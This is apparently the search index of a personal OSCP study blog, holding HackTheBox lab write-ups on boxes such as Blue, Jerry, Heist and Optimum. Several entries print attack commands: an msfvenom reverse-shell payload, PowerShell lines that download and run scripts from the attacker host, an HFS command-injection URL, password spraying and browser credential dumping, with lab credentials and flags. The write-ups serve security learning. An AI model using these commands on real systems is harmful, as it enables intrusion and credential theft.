{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"About this site \u00b6 This website is a place for me to share my progress to OSCP certification. What is the OSCP? \u00b6 A certificate for those interested in offensive security jobs. To become certified the student needs to pass an exam. The exam consits of hacking a handful of computers in a 24 hour period and then submitting a report within the next 24 hours. Study plan \u00b6 I've been studying on and off for years, but recently started taking a more active approach. The Ultimate OSCP Guide by John J. Hacking has been a good outline to prepare for the exam. In December 2021, I completed the PEN-200 course. The course covered basic command line as well as complex topics such as setting up pivots and buffer overflows. Lately, I'm meeting with a study/accountability group weekly to set goals. As I practice techniques on HackTheBox I'll document my steps and post them here to share with family and friends. Upcoming milestones \u00b6 Practice exam - 2/2/2022 Practice report - 2/3/2022 Schedule exam - After practice exam. Take exam Wait for results What is CTF? \u00b6 Capture The Flag (CTF) is a game where each team has a flag they must guard. The first team to steal the other team's flag is the winner. The game has been adopted by the security community as a way to learn and practice hacking techniques. Instead of a flag, there is some file saved on a computer. The goal is to break into a computer and gain access to the file. A few I've played and really enjoyed: - HackTheBox - TryHackMe - OverTheWire","title":"Home"},{"location":"#about-this-site","text":"This website is a place for me to share my progress to OSCP certification.","title":"About this site"},{"location":"#what-is-the-oscp","text":"A certificate for those interested in offensive security jobs. To become certified the student needs to pass an exam. The exam consits of hacking a handful of computers in a 24 hour period and then submitting a report within the next 24 hours.","title":"What is the OSCP?"},{"location":"#study-plan","text":"I've been studying on and off for years, but recently started taking a more active approach. The Ultimate OSCP Guide by John J. Hacking has been a good outline to prepare for the exam. In December 2021, I completed the PEN-200 course. The course covered basic command line as well as complex topics such as setting up pivots and buffer overflows. Lately, I'm meeting with a study/accountability group weekly to set goals. As I practice techniques on HackTheBox I'll document my steps and post them here to share with family and friends.","title":"Study plan"},{"location":"#upcoming-milestones","text":"Practice exam - 2/2/2022 Practice report - 2/3/2022 Schedule exam - After practice exam. Take exam Wait for results","title":"Upcoming milestones"},{"location":"#what-is-ctf","text":"Capture The Flag (CTF) is a game where each team has a flag they must guard. The first team to steal the other team's flag is the winner. The game has been adopted by the security community as a way to learn and practice hacking techniques. Instead of a flag, there is some file saved on a computer. The goal is to break into a computer and gain access to the file. A few I've played and really enjoyed: - HackTheBox - TryHackMe - OverTheWire","title":"What is CTF?"},{"location":"HackTheBox/Arctic/","text":"Arctic \u00b6 Recon \u00b6 The tags for this box are: Windows Arbitrary File Upload Patch Management Web Difficulty: Easy Port scan \u00b6 There is a mystery service running on port 8500. The other open ports are RPC. Better figure out what the mystery service is. PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 8500/tcp open fmtp? syn-ack ttl 127 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%) Port 8500 - Cold Fusion 8 \u00b6 Software version disclosure Searching for exploits 50057 looks promising. Interestingly enough, rhost and rport were already correct -it's almost like this exploit was developed/tested on this HTB box. That gave us shell as arctic\\tolis User flag Privilege Escalation \u00b6 WinPEAS interesting findings \u00b6 Exploit Suggester \u00b6 I've had luck with MS10-059 in the past and figured that was a good way to go. I got the .exe from SecWiki It worked, the listener (left) caught a system shell that was spawned by MS10-059 (right side). Root flag:","title":"Arctic"},{"location":"HackTheBox/Arctic/#arctic","text":"","title":"Arctic"},{"location":"HackTheBox/Arctic/#recon","text":"The tags for this box are: Windows Arbitrary File Upload Patch Management Web Difficulty: Easy","title":"Recon"},{"location":"HackTheBox/Arctic/#port-scan","text":"There is a mystery service running on port 8500. The other open ports are RPC. Better figure out what the mystery service is. PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 8500/tcp open fmtp? syn-ack ttl 127 49154/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)","title":"Port scan"},{"location":"HackTheBox/Arctic/#port-8500-cold-fusion-8","text":"Software version disclosure Searching for exploits 50057 looks promising. Interestingly enough, rhost and rport were already correct -it's almost like this exploit was developed/tested on this HTB box. That gave us shell as arctic\\tolis User flag","title":"Port 8500 - Cold Fusion 8"},{"location":"HackTheBox/Arctic/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"HackTheBox/Arctic/#winpeas-interesting-findings","text":"","title":"WinPEAS interesting findings"},{"location":"HackTheBox/Arctic/#exploit-suggester","text":"I've had luck with MS10-059 in the past and figured that was a good way to go. I got the .exe from SecWiki It worked, the listener (left) caught a system shell that was spawned by MS10-059 (right side). Root flag:","title":"Exploit Suggester"},{"location":"HackTheBox/Blue/","text":"Blue \u00b6 I knew this was going to use the Eternal Blue exploit, so I got Autoblue ready...however AutoBlue wasn't working. I was able to get this one working: $ mkdir eternalblue $ curl https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py > eternalblue/send_and_execute.py $ curl https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py > eternalblue/mysmb.py $ curl https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py > eternalblue/checker.py this is saved in my /opt/eternalblue folder now. Note, I was first getting a message about authentication failure, so I had to use the username guest in the scripts. Then everyhting worked well. With this solution you need to provide an executable file (generate reverse shell with msfvenom) This uses python2 \u00b6","title":"Blue"},{"location":"HackTheBox/Blue/#blue","text":"I knew this was going to use the Eternal Blue exploit, so I got Autoblue ready...however AutoBlue wasn't working. I was able to get this one working: $ mkdir eternalblue $ curl https://raw.githubusercontent.com/helviojunior/MS17-010/master/send_and_execute.py > eternalblue/send_and_execute.py $ curl https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py > eternalblue/mysmb.py $ curl https://raw.githubusercontent.com/worawit/MS17-010/master/checker.py > eternalblue/checker.py this is saved in my /opt/eternalblue folder now. Note, I was first getting a message about authentication failure, so I had to use the username guest in the scripts. Then everyhting worked well. With this solution you need to provide an executable file (generate reverse shell with msfvenom)","title":"Blue"},{"location":"HackTheBox/Blue/#this-uses-python2","text":"","title":"This uses python2"},{"location":"HackTheBox/Devel/","text":"Devel \u00b6 10.10.10.5 ports 21 and 80 are open FTP allows anonymous access we can upload I upload an aspx webshell and have command execution. We then ran sherlock Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Appears Vulnerable I tried each of these, with no success. Then I used google for Windows 7 Enterprise Privilege escallation and the first result is MS11-046 . I found a precompiled binary here: https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046 Using the shell we got from msfvenom I am able to run the exploit and get system admin.","title":"Devel"},{"location":"HackTheBox/Devel/#devel","text":"10.10.10.5 ports 21 and 80 are open FTP allows anonymous access we can upload I upload an aspx webshell and have command execution. We then ran sherlock Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Appears Vulnerable I tried each of these, with no success. Then I used google for Windows 7 Enterprise Privilege escallation and the first result is MS11-046 . I found a precompiled binary here: https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046 Using the shell we got from msfvenom I am able to run the exploit and get system admin.","title":"Devel"},{"location":"HackTheBox/Granny/","text":"Granny \u00b6 10.10.10.15 port 80 is open. The website is under construction, but running IIS 6.0 Able to log in to WebDAV using cadaver with no credentials. We're even able to upload files. I am unable to upload asp files, they seem to be filtered, but we can add a .txt extension for upload then rename once it's up there. I copied /usr/share/webshells/aspx/cmdasp.aspx to the webserver but it doesn't appear to work. We see this is 32bit We generate a reverse shell using msfvenom and upload the same way we did with the webshell. We used Windows-Exploit-Suggester which found a few exploits, none which worked. Then we searched on google for Windows Server 2003 privilege escallation and found Churrasco . Using Churrasco (MS09-012) we are able to run commands as system: We copy over netcat and get a shell that way. Now we can collect the user flag: c:\\documents and settings\\lakis\\desktop\\user.txt and the root flag c:\\documents and settigns\\administrator\\desktop\\root.txt","title":"Granny"},{"location":"HackTheBox/Granny/#granny","text":"10.10.10.15 port 80 is open. The website is under construction, but running IIS 6.0 Able to log in to WebDAV using cadaver with no credentials. We're even able to upload files. I am unable to upload asp files, they seem to be filtered, but we can add a .txt extension for upload then rename once it's up there. I copied /usr/share/webshells/aspx/cmdasp.aspx to the webserver but it doesn't appear to work. We see this is 32bit We generate a reverse shell using msfvenom and upload the same way we did with the webshell. We used Windows-Exploit-Suggester which found a few exploits, none which worked. Then we searched on google for Windows Server 2003 privilege escallation and found Churrasco . Using Churrasco (MS09-012) we are able to run commands as system: We copy over netcat and get a shell that way. Now we can collect the user flag: c:\\documents and settings\\lakis\\desktop\\user.txt and the root flag c:\\documents and settigns\\administrator\\desktop\\root.txt","title":"Granny"},{"location":"HackTheBox/Heist/","text":"Heist \u00b6 10.10.10.149 there is a webserver on port 80. We are able to login as guest. We see an issue by an enduser who has attached their Cisco iOS config. version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0\u00c2 mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh There are a few passwords in this file: secret $1$pdQG$o8nrSzsGXeaduXrjlvKc91 rout3r password 0242114B0E143F015F5D1E161713 admin password 02375012182C1A1D751618034F36415408 We found an online crack tool: https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html and are able to crack the second two passwords secret stealth1agent rout3r $uperP@ssword admin Q4)sJu\\Y8qz*A3?d We used crackmapexec to find a valid set of credentials: crackmapexec smb 10.10.10.149 -u hazard -p stealth1agent hazard has the same password as the secret from the config. we used crackmapexec to RID Bruteforce a few other users. Then added the users to users.txt and password spray again. We found another set of credentials Chase:Q4)sJu\\Y8qz*A3?d This is where we turned to a writeup for some pointers: 1. Use procdump to dump firefox. 2. Copy the file down 3. Strings dump-file | grep login_password 4. Now we have the admin password. admin@support.htb 4dD!5}x/re8]FBuZ Then we use crackmapexec to password spray the newly found password against our list of users obtained from the RID bruteforce. crackmapexec smb 10.10.10.149 -u users -p '4dD!5}x/re8]FBuZ' This is the admin password! And we can execute commands then we spawn a shell using evil-winrm","title":"Heist"},{"location":"HackTheBox/Heist/#heist","text":"10.10.10.149 there is a webserver on port 80. We are able to login as guest. We see an issue by an enduser who has attached their Cisco iOS config. version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0\u00c2 mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh There are a few passwords in this file: secret $1$pdQG$o8nrSzsGXeaduXrjlvKc91 rout3r password 0242114B0E143F015F5D1E161713 admin password 02375012182C1A1D751618034F36415408 We found an online crack tool: https://www.firewall.cx/cisco-technical-knowledgebase/cisco-routers/358-cisco-type7-password-crack.html and are able to crack the second two passwords secret stealth1agent rout3r $uperP@ssword admin Q4)sJu\\Y8qz*A3?d We used crackmapexec to find a valid set of credentials: crackmapexec smb 10.10.10.149 -u hazard -p stealth1agent hazard has the same password as the secret from the config. we used crackmapexec to RID Bruteforce a few other users. Then added the users to users.txt and password spray again. We found another set of credentials Chase:Q4)sJu\\Y8qz*A3?d This is where we turned to a writeup for some pointers: 1. Use procdump to dump firefox. 2. Copy the file down 3. Strings dump-file | grep login_password 4. Now we have the admin password. admin@support.htb 4dD!5}x/re8]FBuZ Then we use crackmapexec to password spray the newly found password against our list of users obtained from the RID bruteforce. crackmapexec smb 10.10.10.149 -u users -p '4dD!5}x/re8]FBuZ' This is the admin password! And we can execute commands then we spawn a shell using evil-winrm","title":"Heist"},{"location":"HackTheBox/Jerry/","text":"Jerry \u00b6 10.10.10.95 port 8080 is running apache tomcat 7.0.88 Dirbuster found /manager and we were able to login with tomcat:s3cret Hunterbot told me about war files. We generate a war file msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f war -o shell.war then upload it when we visit /shell we get a connection on our listener Then we found the flags were both in one file:","title":"Jerry"},{"location":"HackTheBox/Jerry/#jerry","text":"10.10.10.95 port 8080 is running apache tomcat 7.0.88 Dirbuster found /manager and we were able to login with tomcat:s3cret Hunterbot told me about war files. We generate a war file msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.4 LPORT=4444 -f war -o shell.war then upload it when we visit /shell we get a connection on our listener Then we found the flags were both in one file:","title":"Jerry"},{"location":"HackTheBox/Lame/","text":"Lame \u00b6 Recon \u00b6 Tags for this box are: injection cms exploit Difficulty: Easy Port Scan \u00b6 21/tcp open ftp syn-ack ttl 63 vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.7p1 Debian 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%) Exploitation \u00b6 I decided to start with the odd service I hadn't seen before: distcc . Hacktricks recommended checking if the metasploit module exploit/unix/misc/distcc_exec is applicable. Sure enough, I got a daemon account with this exploit. Thanks again HackTricks (all praise the xyz tld!) user ebe6a4bdd37d05257c96607fb05b4486 Privilege Escalation \u00b6 Users \u00b6 Listening ports \u00b6 Local port scan \u00b6 nmap -sV -T5 127.0.0.1 Starting Nmap 4.53 ( http://insecure.org ) at 2021-11-09 23:19 EST who Interesting ports on localhost (127.0.0.1): Not shown: 1691 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 23/tcp open telnet Linux telnetd 25/tcp open smtp Postfix smtpd 53/tcp open domain 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2) 111/tcp open rpcbind 2 (rpc #100000) 139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP) 512/tcp open exec? 513/tcp open rlogin 514/tcp open tcpwrapped 953/tcp open rndc? 1524/tcp open ingreslock? 2049/tcp open nfs 2-4 (rpc #100003) 2121/tcp open ftp ProFTPD 1.3.1 3306/tcp open mysql MySQL 5.0.51a-3ubuntu5 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) 5432/tcp open postgresql PostgreSQL DB 5900/tcp open vnc VNC (protocol 3.3) 6000/tcp open X11 (access denied) 6667/tcp open irc Unreal ircd 8009/tcp open ajp13? At this point I was stuck. I came back to this box later and was able to get root with the pictured metasploit module. Can't quite remember if I found this myself or looked into a write-up. Reminder to update this page if I find notes from this session. Reflect/Compare \u00b6 In the official write-up for this box, everything was identical except the exploitation. We both started with a full portscan, however I took a more arbirary route during exploitation; instead of working through the ports top-down, I just picked an interesting service I hadn't seen before. My exploit: Used exploit/unix/misc/distcc_exec metasploit modul Which granted user level access. I was unable to privesc Later, I came back and used multi/samba/usermap_script Which granted root level access. HTB Writeup: Use multi/samba/usermap_script Grants root level access Analysis \u00b6 While distcc_exe granted user level, it was a dead end as I couldn't figure out how to privesc. After this reflection, I'm confident that I 'found' the usermap_script exploit by looking at the writeup. This is a perfect example of the dangers of immediately jumping to an exploit . Lessons Learned: DON'T just run around testing exploits. It wreckless and can lead to dead ends. DO completely enumerate and try to weaponize each vector BEFORE thinking about exploitation. Exploitation should be closer to the end of my process. Put off exploitation attempts until I'm confident I have fully enumerated services/applications.","title":"Lame"},{"location":"HackTheBox/Lame/#lame","text":"","title":"Lame"},{"location":"HackTheBox/Lame/#recon","text":"Tags for this box are: injection cms exploit Difficulty: Easy","title":"Recon"},{"location":"HackTheBox/Lame/#port-scan","text":"21/tcp open ftp syn-ack ttl 63 vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.7p1 Debian 139/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn syn-ack ttl 63 Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) 3632/tcp open distccd syn-ack ttl 63 distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%)","title":"Port Scan"},{"location":"HackTheBox/Lame/#exploitation","text":"I decided to start with the odd service I hadn't seen before: distcc . Hacktricks recommended checking if the metasploit module exploit/unix/misc/distcc_exec is applicable. Sure enough, I got a daemon account with this exploit. Thanks again HackTricks (all praise the xyz tld!) user ebe6a4bdd37d05257c96607fb05b4486","title":"Exploitation"},{"location":"HackTheBox/Lame/#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"HackTheBox/Lame/#users","text":"","title":"Users"},{"location":"HackTheBox/Lame/#listening-ports","text":"","title":"Listening ports"},{"location":"HackTheBox/Lame/#local-port-scan","text":"nmap -sV -T5 127.0.0.1 Starting Nmap 4.53 ( http://insecure.org ) at 2021-11-09 23:19 EST who Interesting ports on localhost (127.0.0.1): Not shown: 1691 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) 23/tcp open telnet Linux telnetd 25/tcp open smtp Postfix smtpd 53/tcp open domain 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2) 111/tcp open rpcbind 2 (rpc #100000) 139/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP) 512/tcp open exec? 513/tcp open rlogin 514/tcp open tcpwrapped 953/tcp open rndc? 1524/tcp open ingreslock? 2049/tcp open nfs 2-4 (rpc #100003) 2121/tcp open ftp ProFTPD 1.3.1 3306/tcp open mysql MySQL 5.0.51a-3ubuntu5 3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) 5432/tcp open postgresql PostgreSQL DB 5900/tcp open vnc VNC (protocol 3.3) 6000/tcp open X11 (access denied) 6667/tcp open irc Unreal ircd 8009/tcp open ajp13? At this point I was stuck. I came back to this box later and was able to get root with the pictured metasploit module. Can't quite remember if I found this myself or looked into a write-up. Reminder to update this page if I find notes from this session.","title":"Local port scan"},{"location":"HackTheBox/Lame/#reflectcompare","text":"In the official write-up for this box, everything was identical except the exploitation. We both started with a full portscan, however I took a more arbirary route during exploitation; instead of working through the ports top-down, I just picked an interesting service I hadn't seen before. My exploit: Used exploit/unix/misc/distcc_exec metasploit modul Which granted user level access. I was unable to privesc Later, I came back and used multi/samba/usermap_script Which granted root level access. HTB Writeup: Use multi/samba/usermap_script Grants root level access","title":"Reflect/Compare"},{"location":"HackTheBox/Lame/#analysis","text":"While distcc_exe granted user level, it was a dead end as I couldn't figure out how to privesc. After this reflection, I'm confident that I 'found' the usermap_script exploit by looking at the writeup. This is a perfect example of the dangers of immediately jumping to an exploit . Lessons Learned: DON'T just run around testing exploits. It wreckless and can lead to dead ends. DO completely enumerate and try to weaponize each vector BEFORE thinking about exploitation. Exploitation should be closer to the end of my process. Put off exploitation attempts until I'm confident I have fully enumerated services/applications.","title":"Analysis"},{"location":"HackTheBox/Legacy/","text":"Legacy \u00b6 Recon \u00b6 Tags for this box are: Windows Injection Difficulty: Easy A port scan on shows only 2 open TCP ports: 139 , and 445 . Nmap guessed the OS was Windows XP or similar. PORT STATE SERVICE REASON VERSION 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds 3389/tcp closed ms-wbt-server reset ttl 127 Aggressive OS guesses: Microsoft Windows XP SP3 (94%) A deeper look at port 139 reveals this host has not patched MS17-010 (a.k.a. Eternal Blue) | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/ Exploitation \u00b6 Since the path was carved so cleanly from the beginning, I chose to use the metasploit module for this one. It's good practice, right? user: e69af0e4f443de7e36876fda4ec7644f root: 993442d258b0e0ec917cae9e695d5713 Reflect/Compare \u00b6 My path: Scanning identified Windows XP hosting smb. Scanning identified missing ms17-010 patch (CVE-2017-0143) Metasploit module windows/smb/ms17-010_eternalblue Root Walkthrough: Scanning identified Windows XP hosting smb. Researched Windows XP vulns - CVE-2008-4250 Metasploit module windows/smb/08_067_netapi Root Analysis \u00b6 I did a good job on this one. While we used differenet exploits, the path is generally the same. There are likely many other exploits that would have worked to root this box.","title":"Legacy"},{"location":"HackTheBox/Legacy/#legacy","text":"","title":"Legacy"},{"location":"HackTheBox/Legacy/#recon","text":"Tags for this box are: Windows Injection Difficulty: Easy A port scan on shows only 2 open TCP ports: 139 , and 445 . Nmap guessed the OS was Windows XP or similar. PORT STATE SERVICE REASON VERSION 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 127 Windows XP microsoft-ds 3389/tcp closed ms-wbt-server reset ttl 127 Aggressive OS guesses: Microsoft Windows XP SP3 (94%) A deeper look at port 139 reveals this host has not patched MS17-010 (a.k.a. Eternal Blue) | smb-vuln-ms17-010: | VULNERABLE: | Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) | State: VULNERABLE | IDs: CVE:CVE-2017-0143 | Risk factor: HIGH | A critical remote code execution vulnerability exists in Microsoft SMBv1 | servers (ms17-010). | | Disclosure date: 2017-03-14 | References: | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143 | https://technet.microsoft.com/en-us/library/security/ms17-010.aspx |_ https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/","title":"Recon"},{"location":"HackTheBox/Legacy/#exploitation","text":"Since the path was carved so cleanly from the beginning, I chose to use the metasploit module for this one. It's good practice, right? user: e69af0e4f443de7e36876fda4ec7644f root: 993442d258b0e0ec917cae9e695d5713","title":"Exploitation"},{"location":"HackTheBox/Legacy/#reflectcompare","text":"My path: Scanning identified Windows XP hosting smb. Scanning identified missing ms17-010 patch (CVE-2017-0143) Metasploit module windows/smb/ms17-010_eternalblue Root Walkthrough: Scanning identified Windows XP hosting smb. Researched Windows XP vulns - CVE-2008-4250 Metasploit module windows/smb/08_067_netapi Root","title":"Reflect/Compare"},{"location":"HackTheBox/Legacy/#analysis","text":"I did a good job on this one. While we used differenet exploits, the path is generally the same. There are likely many other exploits that would have worked to root this box.","title":"Analysis"},{"location":"HackTheBox/Optimum/","text":"Optimum \u00b6 10.10.10.8 Nmap discovers the only port open is port 80. It's running HttpFileServer 2.3 Using EDB-39161 we are able to get a reverse shell as kostas. Winpeas found kostas' password kdeEjDowkS* Upgrade to a powershell shell so we can run sherlock: powershell -c \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:80/shell.ps1')\" Then we load and run sherlock. It looks like the system is vulnerable to MS16-032 Unfortunately our shell is running in a 32bit process, so we need to drop the shell and upgrade it by running powershell naitive: http://10.10.10.8/?search=%00{.+exec|C%3a\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe%20IEX%20(new-object%20net.webclient).downloadstring(%27http://10.10.16.4:80/shell.ps1%27)%22+.} Now we're running a 64 bit process and can run the exploit: IEX (new-object net.webclient).downloadstring('http://10.10.16.4:80/MS16-032.ps1')","title":"Optimum"},{"location":"HackTheBox/Optimum/#optimum","text":"10.10.10.8 Nmap discovers the only port open is port 80. It's running HttpFileServer 2.3 Using EDB-39161 we are able to get a reverse shell as kostas. Winpeas found kostas' password kdeEjDowkS* Upgrade to a powershell shell so we can run sherlock: powershell -c \"IEX (new-object net.webclient).downloadstring('http://10.10.16.4:80/shell.ps1')\" Then we load and run sherlock. It looks like the system is vulnerable to MS16-032 Unfortunately our shell is running in a 32bit process, so we need to drop the shell and upgrade it by running powershell naitive: http://10.10.10.8/?search=%00{.+exec|C%3a\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe%20IEX%20(new-object%20net.webclient).downloadstring(%27http://10.10.16.4:80/shell.ps1%27)%22+.} Now we're running a 64 bit process and can run the exploit: IEX (new-object net.webclient).downloadstring('http://10.10.16.4:80/MS16-032.ps1')","title":"Optimum"},{"location":"HackTheBox/Pasted%20image%2020220713093106.png/","text":"","title":"Pasted image 20220713093106.png"},{"location":"HackTheBox/Remote/","text":"Remote \u00b6 We find a network file system Make a directory for it mkdir site_backups and mount it sudo mount -t nfs There are a bunch of files. These appear to be the backup files for umbro CMS. We find some interesting content in App_data/Umbraco.sdf strings Umbraco.sdf | head -n 20 Administratoradmindefaulten-US Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{\"hashAlgorithm\":\"SHA1\"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={\"hashAlgorithm\":\"HMACSHA256\"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749 ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={\"hashAlgorithm\":\"HMACSHA256\"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32 We have the following username/hash combos admin:b8be16afba8c314ad33d812f22a04991b90e2aaa (SHA1) smith:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= (HMACSHA256) ssmith:jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts= (HMACSHA256) We're able to crack admin's hash using crackstation admin:baconandcheese We can now log in, but need to use the admin's email: admin@htb.local Now we can use EDB-49488 which grants RCE through Umbraco with credentials. python3 49488.py -u admin@htb.local -p baconandcheese -i http://remote:80/ -c whoami This exploit seemed limited, so I switched to a similar exploit EDB-46153 We had 